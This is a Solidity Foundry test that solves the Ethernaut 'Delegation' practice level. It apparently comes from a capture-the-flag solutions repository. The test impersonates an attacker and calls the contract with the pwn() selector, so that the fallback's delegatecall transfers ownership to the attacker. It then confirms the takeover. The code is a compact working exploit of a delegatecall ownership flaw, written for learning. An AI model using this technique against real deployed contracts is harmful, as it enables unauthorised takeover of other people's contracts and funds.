// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {DelegationFactory} from "src/levels/DelegationFactory.sol";
import {Delegation} from "src/levels/Delegation.sol";
import {IDelegate} from "src/hack/interfaces/IDelegate.sol";

contract DelegationTest is Test {
    DelegationFactory private factory;
    Delegation private delegation;
    address private attacker = makeAddr("attacker");

    function setUp() external {
        factory = new DelegationFactory();
        address delegateAddress = factory.createInstance(attacker);
        delegation = Delegation(delegateAddress);
    }

    function testDelegationHack() external {
        vm.startPrank(attacker);

        (bool success, ) = address(delegation).call(
            // Trigger fallback function with pwn() function selector
            abi.encodeCall(IDelegate.pwn, ())
        );

        if (success) {
            assertEq(delegation.owner(), attacker);

            // Validate using Ethernaut validation
            factory.validateInstance(payable(address(delegation)), attacker);
            vm.stopPrank();
            return;
        }

        fail("Delegation Failed!!!");
    }
}
